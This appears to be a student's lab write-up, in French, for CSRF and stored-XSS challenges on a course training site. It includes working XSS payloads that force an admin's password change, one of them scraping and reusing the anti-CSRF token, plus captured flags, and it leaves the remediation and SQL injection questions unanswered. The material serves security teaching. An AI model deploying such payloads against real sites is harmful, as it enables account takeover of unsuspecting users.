# Lab 1

## CSRF Simple

### 1. Quelle fonctionnalité du site, potentiellement vulnérable à une faille CSRF, pourriez-vous exploiter pour voler le compte administrateur ?


```javascript

fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn", {
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
  "body": "password=test",
  "method": "POST",
});
```


### 2. Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l’administrateur

   
### 3. Ecrivez une payload javascript qui exécute la requête.

```html

<img src='invalid.jpg' onerror="
  fetch('/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  })
  .then(response => {
    if (response.ok) {
      alert('Fetch request was successful!');
    } else {
      alert('Fetch request failed with status: ' + response.status);
    }
  })
  .catch(error => alert('Fetch error: ' + error));
">


```


### 4. Quelle fonctionnalité du site, potentiellement vulnérable à une faille Stored XSS, pourriez-vous exploiter pour faire exécuter votre payload

Exploitation de la validation d'input.

### Quel est le flag ? Comment avez-vous pu l'obtenir ?
Injection XSS dans le formulaire envoyé à l'administrateur.

```html

<img src='invalid.jpg' onerror="
  fetch('/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  })
  .then(response => {
    if (response.ok) {
      alert('Fetch request was successful!');
    } else {
      alert('Fetch request failed with status: ' + response.status);
    }
  })
  .catch(error => alert('Fetch error: ' + error));
">

```

```bash

Congratulation ! You flag is : 8YeeieGoK/aDoTwo

```
### Comment corrigeriez-vous la vulnérabilité ? 

## CSRF Avancée

### 1. Qu’est-ce qu’un jeton anti-CSRF, comment fonctionne-t-il ? 

### 2. Comment déterminer si le formulaire est protégé par un jeton anti-CSRF ? 

### 3. Le site est également vulnérable à une attaque XSS. Quel est le flag du challenge ? Décrivez l’attaque.

```html

<img src='invalid.jpg' onerror="
  fetch('/profile/nathan.rayburn_admin', { method: 'GET' })
    .then(response => response.text())
    .then(html => {
      // Parse the response HTML and extract the CSRF token
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const csrfToken = doc.querySelector('#_csrf').value;
      
      // Now use the token to execute the password change
      return fetch('/profile/nathan.rayburn_admin', {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `_csrf=${csrfToken}&password=test`,
        method: 'POST'
      });
    })
    .then(response => {
      if (response.ok) {
        alert('Password change request was successful!');
      } else {
        alert('Password change request failed with status: ' + response.status);
      }
    })
    .catch(error => alert('Fetch error: ' + error));
">
```

```bash

Congratulation ! You flag is : wMQf78jUXavuMdp1

```

### 4. Comment corrigeriez-vous la vulnérabilité ?

## Injection SQL

1. Quelle partie du service est vulnérable à une injection SQL ? 
   
2. Le serveur implémente une forme insuffisante de validation des entrées. Expliquer pourquoi c’est insuffisant. 
   
3. Quel est le flag ? Comment avez-vous procédé pour l’obtenir ? 
   
4. Quel est le DBMS utilisé ? Auriez-vous procédé différement si le DBMS avait été MySQL ou MariaDB ?